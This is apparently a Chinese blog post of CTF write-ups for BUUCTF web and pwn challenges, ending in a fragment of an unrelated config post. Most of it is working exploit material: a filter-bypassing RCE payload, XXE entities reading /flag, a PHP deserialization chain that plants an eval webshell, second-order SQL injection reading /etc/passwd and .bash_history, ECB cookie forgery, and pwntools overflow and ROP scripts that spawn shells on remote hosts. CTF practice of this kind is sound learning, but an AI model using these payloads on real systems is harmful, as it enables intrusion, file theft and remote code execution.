1_=(%ff%ff%ff%ff%ff%ff%ff^%8f%8d%96%91%8b%a0%8d)((%ff%ff%ff%ff^%9c%96%91%9c^%96%96%8f%8d^%91%96%8d%8b^%8f%96%8d%8b^%8d%96%8d%8b)((%ff%ff%ff^%9c%91%9c^%8d%91%96^%8b%91%91)((%ff%ff%ff%ff%ff%ff%ff^%96%9c%9c%91%9c%96%8d^%91%9c%8f%91%96%96%8d^%8b%9c%8d%91%91%96%8d)((%8b^%a0^%96^%91^%8f^%8d))))); 很有趣的题目, 就是调的比较累2333 [FBCTF2019]RCEService原来这题是给源码的, 我说怎么日不动…. 123456789101112131415161718192021222324&lt;?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) &#123; $json = $_REQUEST['cmd']; if (!is_string($json)) &#123; echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; &#125; elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) &#123; echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; &#125; else &#123; echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo 'Invalid input'; &#125; echo '&lt;br/&gt;&lt;br/&gt;'; &#125;&#125;?&gt; 这题的预期解虽然是PCRE, 但是感觉很强行, %0a换行更好 1cmd=&#123;%0a&quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;%0a&#125; 另外的解看p神的博客 https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html 就可以明白了, 不过需要注意的是数据量比较大, 需要用POST传, 这也是题目用$_REQUEST的原因 [DDCTF 2019]homebrew event loop挺有意思的题目, 是个flask的审计 首先看源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174from flask import Flask, session, request, Responseimport urllibapp = Flask(__name__)app.secret_key = '*********************' # censoredurl_prefix = '/d5afe1f66147e857'def FLAG(): return '*********************' # censoreddef trigger_event(event): session['log'].append(event) if len(session['log']) &gt; 5: session['log'] = session['log'][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event)def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystackclass RollBackException: passdef execute_event_loop(): valid_event_chars = set( 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') resp = None while len(request.event_queue) &gt; 0: # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\" event = request.event_queue[0] request.event_queue = request.event_queue[1:] if not event.startswith(('action:', 'func:')): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == 'a' action = get_mid_str(event, ':', ';') args = get_mid_str(event, action+';').split('#') try: event_handler = eval( action + ('_handler' if is_action else '_function')) ret_val = event_handler(args) except RollBackException: if resp is None: resp = '' resp += 'ERROR! All transactions have been cancelled. &lt;br /&gt;' resp += '&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' session['num_items'] = request.prev_session['num_items'] session['points'] = request.prev_session['points'] break except Exception, e: if resp is None: resp = '' # resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == '': resp = ('404 NOT FOUND', 404) session.modified = True return resp@app.route(url_prefix+'/')def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == '' or (not querystring.startswith('action:')) or len(querystring) &gt; 100: querystring = 'action:index;False#False' if 'num_items' not in session: session['num_items'] = 0 session['points'] = 3 session['log'] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop()# handlers/functions below --------------------------------------def view_handler(args): page = args[0] html = '' html += '[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'.format( session['num_items'], session['points']) if page == 'index': html += '&lt;a href=\"./?action:index;True%23False\"&gt;View source code&lt;/a&gt;&lt;br /&gt;' html += '&lt;a href=\"./?action:view;shop\"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;' html += '&lt;a href=\"./?action:view;reset\"&gt;Reset&lt;/a&gt;&lt;br /&gt;' elif page == 'shop': html += '&lt;a href=\"./?action:buy;1\"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;' elif page == 'reset': del session['num_items'] html += 'Session reset.&lt;br /&gt;' html += '&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' return htmldef index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == 'True': source = open('eventLoop.py', 'r') html = '' if bool_download_source != 'True': html += '&lt;a href=\"./?action:index;True%23True\"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;' html += '&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' for line in source: if bool_download_source != 'True': html += line.replace('&amp;', '&amp;amp;').replace('\\t', '&amp;nbsp;'*4).replace( ' ', '&amp;nbsp;').replace('&lt;', '&amp;lt;').replace('&gt;', '&amp;gt;').replace('\\n', '&lt;br /&gt;') else: html += line source.close() if bool_download_source == 'True': headers = &#123;&#125; headers['Content-Type'] = 'text/plain' headers['Content-Disposition'] = 'attachment; filename=serve.py' return Response(html, headers=headers) else: return html else: trigger_event('action:view;index')def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return 'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'.format(args[0]) session['num_items'] += num_items trigger_event(['func:consume_point;&#123;&#125;'.format( num_items), 'action:view;index'])def consume_point_function(args): point_to_consume = int(args[0]) if session['points'] &lt; point_to_consume: raise RollBackException() session['points'] -= point_to_consumedef show_flag_function(args): flag = args[0] # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return 'You naughty boy! ;) &lt;br /&gt;'def get_flag_handler(args): if session['num_items'] &gt;= 5: # show_flag_function has been disabled, no worries trigger_event('func:show_flag;' + FLAG()) trigger_event('action:view;index')if __name__ == '__main__': app.run(debug=False, host='0.0.0.0') 首先看路由 12345678910111213@app.route(url_prefix+'/')def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == '' or (not querystring.startswith('action:')) or len(querystring) &gt; 100: querystring = 'action:index;False#False' if 'num_items' not in session: session['num_items'] = 0 session['points'] = 3 session['log'] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop() 可以看到这里是利用了request.query_string获取我们的输入, 并执行相应的调用, 第一步是经过trigger_event 12345678def trigger_event(event): session['log'].append(event) if len(session['log']) &gt; 5: session['log'] = session['log'][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) 这个函数首先将调用放入session, 然后再添加到执行列表request.event_queue, 而不是立刻执行 第二步调用execute_event_loop开始执行 12345678910111213141516171819202122232425262728293031323334353637383940414243def execute_event_loop(): valid_event_chars = set( 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') resp = None while len(request.event_queue) &gt; 0: # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\" event = request.event_queue[0] request.event_queue = request.event_queue[1:] if not event.startswith(('action:', 'func:')): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == 'a' action = get_mid_str(event, ':', ';') args = get_mid_str(event, action+';').split('#') try: event_handler = eval( action + ('_handler' if is_action else '_function')) ret_val = event_handler(args) except RollBackException: if resp is None: resp = '' resp += 'ERROR! All transactions have been cancelled. &lt;br /&gt;' resp += '&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' session['num_items'] = request.prev_session['num_items'] session['points'] = request.prev_session['points'] break except Exception, e: if resp is None: resp = '' # resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == '': resp = ('404 NOT FOUND', 404) session.modified = True return resp 关键在这一段 1234567is_action = event[0] == 'a'action = get_mid_str(event, ':', ';')args = get_mid_str(event, action+';').split('#')try: event_handler = eval( action + ('_handler' if is_action else '_function')) ret_val = event_handler(args) 中间的get_mid_str也很好理解, 就是获取两个参数中间的一段, 后面我们可以看到有个eval解析字符串, 但是会加上_handler或者_function来防止任意命令执行, 但是如果我们的输入中有#, 在eval执行时就会将后面的内容注释, 也就是 12action = &quot;FLAG#&quot;eval(&quot;FLAG#_handler&quot;) = eval(&quot;FLAG&quot;) 从而可以命令执行, 但是我们看一下获取flag的地方 12345678910111213def FLAG(): return '*********************' # censored def show_flag_function(args): flag = args[0] # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return 'You naughty boy! ;) &lt;br /&gt;'def get_flag_handler(args): if session['num_items'] &gt;= 5: # show_flag_function has been disabled, no worries trigger_event('func:show_flag;' + FLAG()) trigger_event('action:view;index') 直接调用FLAG()的话, 由于传入的参数是list 1args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;) 会导致报错, 所以我们需要找到可以传入list的函数, 如果直接调用get_flag_handler的话需要使得 1session[&apos;num_items&apos;] &gt;= 5 但是这里没有条件竞争, 直接调用不行, 我们看一下买的地方 1234567def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return 'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'.format(args[0]) session['num_items'] += num_items trigger_event(['func:consume_point;&#123;&#125;'.format( num_items), 'action:view;index']) 可以看到这里不判断有没有足够的点数就直接添加了, 所以我们可以通过下面的调用来获取flag 1trigger_event([&quot;action:buy_handler;7&quot;,&quot;action:get_flag_handler&quot;]) 这样的执行顺序为 添加action:buy_handler;7到queue 添加action:get_flag_handler到queue 执行``action:buy_handler;7, 添加func:consume_point;{}`到queue 执行action:get_flag_handler, 添加&#39;func:show_flag;&#39; + FLAG()到queue 依次执行剩下的元素 可以看到, FLAG()会被顺利的执行, 然后我们只需要解密session就能看到执行的log, 从而获取flag了 payload如下 1/?action:trigger_event%23;action:buy;7%23action:get_flag; 然后获取cookie 1.eJyNjl9rgzAAxL_KyHMfNKkTBV_GplBmpEWaP2MMY7pqNKmgdjXF7z4ZbDC6h70d3N3v7gra0xGEL1dwJ0AIGMFOQYIxM7upINJwunnnlLfCbFUGYyWT9ixUV0va-HjCFUO7TsD1PYd7h0LeM1L6YF7d4PTGPeQ9WqwbR7YyDrRIYpN9RBGYX3_a3OxHZjsloGclcVuKHs4F8ZzMltEfJMM7Tkt_STScHr9Iv0G2SAL0_ZLrS8XRoPBj6WH1dEknB2LN7HO-XTOVDkzjBtduw3PcpAnzUlXp1MbB_4aBGfVbPRx0D0JnBbpTbYZFovkTybx2QQ.Xkzsbg.SkZ-vfJDGGh0vxZvYMbSXmEEaPM 利用 https://www.leavesongs.com/PENETRATION/client-session-security.html 的脚本 1234567891011121314151617181920212223242526272829303132import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(b'.', 1) payload, timestamp = payload.rsplit(b'.', 1) decompress = False if payload.startswith(b'.'): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception('Could not base64 decode the payload because of ' 'an exception') if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception('Could not zlib decompress the payload before ' 'decoding the payload') return session_json_serializer.loads(payload)if __name__ == '__main__': print(decryption(sys.argv[1].encode())) 解密如下 1&#123;'log': [b'action:trigger_event#;action:buy;7#action:get_flag;', [b'action:buy;7', b'action:get_flag;'], [b'func:consume_point;7', b'action:view;index'], b'func:show_flag;flag&#123;c4796113-66f3-48b3-bcd6-de3d0f928f31&#125;', b'action:view;index'], 'num_items': 0, 'points': 3&#125; 回去看了p神的文章, flask的session处理步骤如下 json.dumps 将对象转换成json字符串，作为数据 如果数据压缩后长度更短，则用zlib库进行压缩 将数据用base64编码 通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割 所以这里虽然不知道secret_key, 但是依然可以正常解密, 只是无法伪造(因为有签名) [NCTF2019]Fake XML cookbookxml的题基本都是xxe, 那么这里用payload 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; &lt;user&gt; &lt;username&gt;&amp;goodies;&lt;/username&gt; &lt;password&gt;mypass&lt;/password&gt;&lt;/user&gt; 即可读取 [强网杯 2019]Upload当时做的时候记得有源码的, 这里下不来, 上网找一个就可以了 https://github.com/glzjin/qwb_2019_upload 然后审计一下, 主要的代码在这个位置 首先关注一下反序列化的点, index.php里面 123456789101112public function login_check()&#123; $profile=cookie('user'); if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); $this-&gt;profile_db=db('user')-&gt;where(\"ID\",intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123; return 1; &#125;else&#123; return 0; &#125; &#125;&#125; 可以看到会将cookie进行反序列化 然后读一下代码, 没有什么可以直接执行的函数, 就只能通过文件上传getshell了, 看一下上传的部分 123456789101112131415161718192021222324252627public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).\".png\"; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=\"../upload/$this-&gt;upload_menu/$this-&gt;filename\"; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error('Forbidden type!', url('../index')); &#125; &#125;else&#123; $this-&gt;error('Unknow file type!', url('../index')); &#125;&#125; 这里有个拼接后缀名 12345if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).\".png\"; $this-&gt;ext_check(); &#125; 只要不传文件就可以了, 所以我们需要设置的值为 123456789class Profile extends Controller&#123; public $checker = 0; public $filename_tmp = \"shell_pwd\"; public $filename = \"cjm00n.php\"; public $upload_menu; public $ext = 1; public $img; public $except; 那么反序列化的入口就是前面的__destruct 123456public function __destruct()&#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125;&#125; 如果我们让check为Profile, 那么对其调用index, 会触发__call 123456public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125; __call会去找index对象, 从而触发__get方法, 返回except[&#39;index&#39;] 1234public function __get($name)&#123; return $this-&gt;except[$name];&#125; 那么我们可以赋值如下 1234567891011121314151617181920class Profile extends Controller&#123; public $checker = 0; public $filename_tmp = \"shell_pwd\"; public $filename = \"cjm00n.php\"; public $upload_menu; public $ext = 1; public $img; public $except = array(\"index\" =&gt; \"upload_img\");&#125;class Register extends Controller&#123; public $checker; public $registed; public function __construct() &#123; $this-&gt;checker=new Profile(); &#125;&#125; 调用链如下 1new Register() =&gt; __destruct() =&gt; profile-&gt;index =&gt; __call =&gt; __get =&gt; __call =&gt; upload_img 先上传文件, 生成一个图片格式的shell 123456789# xbm formatSIZE_HEADER = b\"#define width 1\\n#define height 1\\n\\n\"# wbmp formatSIZE_HEADER = b\"\\x00\\x00\\x8a\\x39\\x8a\\x39\"# shellSHELL = b\"&lt;?php eval($_REQUEST['c']);?&gt;\"f = open(\"cjm00n.png\", \"wb\")f.write(SIZE_HEADER+SHELL)f.close() 得到路径 1/public/upload/2c67ca1eaeadbdc1868d67003072b481/be111107dc8d38cd69e24a8af989bee8.png 然后构造exp 123456789101112131415161718192021222324252627&lt;?phpnamespace app\\web\\controller;class Profile&#123; public $checker = 0; public $filename_tmp = \"../public/upload/2c67ca1eaeadbdc1868d67003072b481/be111107dc8d38cd69e24a8af989bee8.png\"; public $filename = \"cjm00n.php\"; public $upload_menu; public $ext = 1; public $img; public $except = array(\"index\" =&gt; \"upload_img\");&#125;class Register&#123; public $checker; public $registed = 0; public function __construct() &#123; $this-&gt;checker=new Profile(); &#125;&#125;$o = new Register();echo base64_encode(serialize($o));echo \"\\n\"; 发过去, 就可以在网站根目录看到shell了 [HarekazeCTF2019]encode_and_encode12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phperror_reporting(0);if (isset($_GET['source'])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal '\\.\\.', // no stream wrapper '(php|file|glob|data|tp|zip|zlib|phar):', // no data exfiltration 'flag' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents('php://input');$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) &#123; $page = $json['page']; $content = file_get_contents($page); if (!$content || !is_valid($content)) &#123; $content = \"&lt;p&gt;not found&lt;/p&gt;\\n\"; &#125;&#125; else &#123; $content = '&lt;p&gt;invalid request&lt;/p&gt;';&#125;// no data exfiltration!!!$content = preg_replace('/HarekazeCTF\\&#123;.+\\&#125;/i', 'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;', $content);echo json_encode(['content' =&gt; $content]); 根据手册, 只要编码成utf-8就可以绕过第一步, 第二步使用伪协议编码即可 在网上一直没找到英文字母转unicode的方法, 就自己写了个脚本 123456789101112131415import jsonimport requestsfrom time import sleepdef s2u(payload): res = \"\" for i in payload: res += f\"\\\\u00&#123;hex(ord(i)).lstrip('0x')&#125;\" return resf = open(\"out\", \"wb\")data = &#123;&#125;payload = s2u(\"php://filter/read=convert.base64-encode/resource=/flag\")data['page'] = payloadres = (json.dumps(data)).replace(\"\\\\\\\\\", \"\\\\\")print(res) [网鼎杯 2018]Comment这里需要爆破三位密码, 不想爆buu就直接上网查一下知道是666, 登录后可以发帖 这里长得就特别像一个二次注入, 总觉得和哪道题很像, 然后就日半天没反应了 发现有个.git泄露, 但是这里下载的不全, 我用的是vscode的gitlens, 补全了一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude \"mysql.php\";session_start();if($_SESSION['login'] != 'yes')&#123; header(\"Location: ./login.php\"); die();&#125;if(isset($_GET['do']))&#123;switch ($_GET['do'])&#123;case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = \"insert into board set category = '$category', title = '$title', content = '$content'\"; $result = mysql_query($sql); header(\"Location: ./index.php\"); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = \"select category from board where id='$bo_id'\"; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0)&#123; $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = \"insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'\"; $result = mysql_query($sql); &#125; header(\"Location: ./comment.php?id=$bo_id\"); break;default: header(\"Location: ./index.php\");&#125;&#125;else&#123; header(\"Location: ./index.php\");&#125;?&gt; 确实是二次注入, 虽然这里有个addslashes函数, 但是我们测试一下就可以知道, 这个函数只会在mysql语句执行的时候转义, 从数据库中提取的内容还是原来的输入 假设我们输入 1&apos;,content=user(),/* 经过转义后为 1\\&apos;,content=user(),/* 输入到数据后转义消失 1&apos;,content=user(),/* 那么我们就可以构造如下payload, 在第一个category设置 1&apos;,content=user(),/* 然后留言为 1*/# 拼接起来就是 1&apos;,content=user(),/*....*/# 成功注入 这里主要参考 2018网鼎杯第四场 看到是 root 用户，一般 flag 就不会在数据库里面(因为如果在数据库中，不需要这么高的权限，实际也确实没有)，应该是要用 SQL语句 读取flag文件了。 读文件如下 1&apos;,content=(select load_file(&quot;/etc/passwd&quot;),/* 看到有www用户, 读取他的操作历史 1&apos;,content=(select load_file(&quot;/home/www/.bash_history&quot;),/* 看到有个.DS_Store, 做过源码泄露的应该都知道这个文件会有一些文件夹的信息, 但是这里执行了rm -f 仔细看命令会发现, 这里是删除了/var/www/html/下的, 而原来解压的/tmp/html目录下还存在, 那么就可以读出来 1&apos;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/* 这里需要用hex编码, 因为里面有很多不可见字符, 然后可以看到有个php 读取即可 1&apos;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/* [BSidesCF 2019] Koocie我也不太理解, 设了个cookie莫名其妙就给我flag了, 可能题目就是这意思吧 [BSidesCF 2019]Pick Tac Toe这是一题井字棋, 众所周知, 高手对决总是不分胜负的, 所以靠实力下赢电脑是不可能的 但是由于他是通过ajax异步传输的, 每次传输后刷新页面, 如果我们自己发包, 连走三棋, 再刷新页面, 就可以让电脑认输(误 打开控制台 1234$.post(&quot;/move&quot;,&quot;move=b&quot;);$.post(&quot;/move&quot;,&quot;move=br&quot;);$.post(&quot;/move&quot;,&quot;move=bl&quot;);location.reload(); 然后收获flag jarvisoj_level0无聊做道入门的pwn, 先看一下文件和保护 拉到ida看一下 跟进vulenrable_function 有读的操作, 将0x200的数据读入0x80h的buf, 存在溢出, 并且有个后门函数在0x400596 那么我们只需要将程序流覆盖到这个后门函数即可, 需要覆盖的范围应该是 1buf -&gt; ret 也就是-0x80-0x8, payload如下 12345678from pwn import *io = remote(\"node3.buuoj.cn\",26279)io.recvline()payload = b\"a\" * 0x88payload += p64(0x400596)io.send(payload)io.interactive() jarvisoj_level1 可以看到没有开NX堆栈保护, main函数如下 跟进vulenrable_function 这次没有了后门函数, 但是NX保护没开, 就可以将shellcode写入堆栈, 再将地址指向堆栈上shellcode的地址, 就可以执行了, buf的大小为0x8c 想法是很美好的, buuoj上面却一直打不通, 感觉上面的文件和给的附件不一样, 打了一下jarvisoj的可以通 123456789101112131415from pwn import *io = remote(\"node3.buuoj.cn\",27940)# io = remote(\"pwn2.jarvisoj.com\",\"9877\")context.log_level = 'debug'addr = int(io.recvline()[len(\"What's this:\"):-2],16)print(addr)shellcode = asm(shellcraft.sh())# shellcode=b\"\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xb0\\x0b\\xcd\\x80\"payload = shellcodepayload += \"a\" * (0x8c - len(shellcode))payload += p64(addr)io.send(payload)io.interactive() 看了下南梦师傅的exp, 不是很懂, 后面再研究看看, 菜鸡pwn手的心理受到了巨大的创伤 jarvisoj_level2学习了一下南梦师傅的exp写法, 这题其实就是找system然后执行就可以了 或者这里 exp如下 1234567891011121314151617181920212223242526from pwn import *context.log_level = 'debug'context.arch = 'i386'elf = ELF(\"./level2\")sh = 0lib = 0def exp(ip, port, debug=0): global sh if debug: sh = process(\"./level2\") else: sh = remote(ip, port) bin_sh_addr = elf.search(\"/bin/sh\").next() # system_addr = elf.[\"system\"] system_addr = 0x804849E # print(bin_sh_addr) print(system_addr) payload = \"a\" * (0x88 + 0x4) payload += p32(system_addr) payload += p32(bin_sh_addr) sh.send(payload) sh.interactive()if __name__ == '__main__': exp(\"node3.buuoj.cn\", 26653, 0) jarvisoj_level2_x6432位和64位在函数传参的地方有所不同, 64位前6个参数是放在寄存器上, 第一个是rdi, 所以我们要想办法把/bin/sh传入rdi, 这里需要用到ROPgadget 可以看到程序找到了一些可用的汇编语句, 我们先来看一下红框中的语句 1pop rdi ; ret pop rdi: 将栈顶的数据弹出, 传给rdi ret: 将栈顶的数据弹出, 跳转到该地址 我们依次传入/bin/sh和system的地址, 栈上的状态如下 12/bin/shsystem 那么我们就可以顺利的将rdi加载为/bin/sh 构造exp如下 12345678910111213141516171819202122232425from pwn import *context.log_level = 'debug'context.arch = 'amd64'elf = ELF(\"./level2_x64\")sh = 0lib = 0def exp(ip, port, debug=0): global sh if debug: sh = process(\"./level2_x64\") else: sh = remote(ip, port) pop_rdi_ret_addr = 0x4006b3 bin_sh_addr = elf.search(\"/bin/sh\").next() system_addr = 0x400603 payload = \"a\" * (0x88) payload += p64(pop_rdi_ret_addr) payload += p64(bin_sh_addr) payload += p64(system_addr) sh.send(payload) sh.interactive()if __name__ == '__main__': exp(\"node3.buuoj.cn\", 25012, 0) jarvisoj_level3 看一下vuln函数 这次开启了NX保护, 也没有后门函数, 就只能去libc里面找了 但是这里坑的地方就是, 我去翻了题目github地址的libc是2.19, 实际上并不是, 然后就一直time_out… 我们想要利用libc中自带的函数, 需要先找到基址, 而write函数就可以用来泄露地址, 然后与我们本地的相减就能求出基址, 就可以实现任意调用了 libc的部分参考网上的wp使用了LibcSearcher来找, 就很顺利了hhh exp如下 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *from LibcSearcher import *context.log_level = 'debug'context.arch = 'i386'elf = ELF(\"./level3\")sh = 0# lib = ELF(\"./libc-2.19.so\")def exp(ip, port, debug=0): global sh if debug: sh = process(\"./level3\") else: sh = remote(ip, port) # leak write payload = \"a\" * (0x88 + 0x4) payload += p32(elf.plt['write']) payload += p32(0x8048495) # vuln payload += p32(0x1) payload += p32(elf.got['write']) payload += p32(0x4) sh.recvuntil(\"Input:\\n\") sh.send(payload) write_addr = u32(sh.recv(4)) # calc system &amp; /bin/sh lib = LibcSearcher(\"write\", write_addr) image_base = write_addr - lib.dump(\"write\") system_addr = image_base + lib.dump(\"system\") bin_sh_addr = image_base + lib.dump(\"str_bin_sh\") # getshell payload = \"a\" * (0x88 + 0x4) payload += p32(system_addr) payload += p32(0xdeadbeef) payload += p32(bin_sh_addr) sh.recvuntil(\"Input:\\n\") sh.sendline(payload) sh.interactive()if __name__ == '__main__': exp(\"node3.buuoj.cn\", 25297, 0) pwn的快乐暂时到这里了, 后面有空再玩一下 [BSidesCF 2019]Mixer这道题挺巧妙的, 如果看过WP的话可以知道这是AES的ECB翻转攻击 首先要打开burp的这个设置 这样方便我们跟随跳转而不用手动设置cookie 登录后可以看到多了一个user的cookie, 并且提示说 1And you can safely ignore the rack.session cookie. Like actually. But that other cookie, however.... (中间省略一堆日cookie的时间) 我们先随便改一位试试 发现报错, 是一个json的解密, 乱码的只有我们修改的那个块, 可以推测是ECB加密, 如果是CBC的话, 前面也会变成乱码 我们知道ECB加密是16位一组, 并且每组互相独立, 加密后为32位, 而这里的目标是让is_admin变成1, 单纯的翻转的话不太好操作, 毕竟我们不知道IV, 但是在json中 11.0 = 1 那如果我们构造刚好16位, 也就是1.00000000000000, 使得这个块独立加密, 然后再放到is_admin中, 就可以将is_admin变成1了 先写出json 1&#123;&quot;first_name&quot;:&quot;&quot;,&quot;last_name&quot;:&quot;&quot;,&quot;is_admin&quot;:&#125; 观察到前面的 1&#123;&quot;first_name&quot;:&quot; 总共15位, 加上一位就可以变成16位, 即这样 1&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;&quot;,&quot;is_admin&quot;:&#125; 就可以顺利获取我们需要的1.00000000000000的加密块了 再观察后面, 使得 1&quot;,&quot;last_name&quot;:&quot;&quot;,&quot;is_admin&quot;: 为16的整数倍, 中间需要填充4个字符, 也就是 1&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;A333&quot;,&quot;is_admin&quot;:&#125; 那么这个json会被分为5个部分加密 12345&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;A333&quot;,&quot;is_admin&quot;:&#125; 其中最后一个块会被填充到16位, 我们首先将上面的json以get方式提交 1/?action=login&amp;first_name=A1.00000000000000&amp;last_name=A333 然后获取cookie 12a3a97a1e1a60d30206bd0710c7d6436c21965416ed467e21d650a0e019b68eff2c3b097feb7610eb39b30a3bddadcd1967867848b5b83d2629292395c9af2835c8ac8596bd3f958383991f95d145726 33-64位, 添加到最后的32位之前 12a3a97a1e1a60d30206bd0710c7d6436c21965416ed467e21d650a0e019b68eff2c3b097feb7610eb39b30a3bddadcd1967867848b5b83d2629292395c9af283c21965416ed467e21d650a0e019b68ef5c8ac8596bd3f958383991f95d145726 就可以看到flag了 [BSidesCF 2019]Futurella 看到奇怪的东西, 还以为是在做misc, 实际上真的是misc 签到题了解一下 [BSidesCF 2019]SVGMagic原来这题是要看图片的… svg其实就是xml, 所以还是xxe, 不过我一直以为解码base64就会看到, 直到我打开了图片hhh 后面就随便读了 [BSidesCF 2019]FlagSrv","link":"/2020/02/18/Buu刷题记录3/"},{"title":"Config文档","text":"记录下常用的配置 git proxy让git走代理, 基本可以达到满速 1git config --global http.https://github.com.proxy socks5h://127.0.0.1:10808 删除代理 1git config --global --unset http.https://github.com.proxy zsh12apt install zshsh -c &quot;$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot; zshrc12345678910111213# 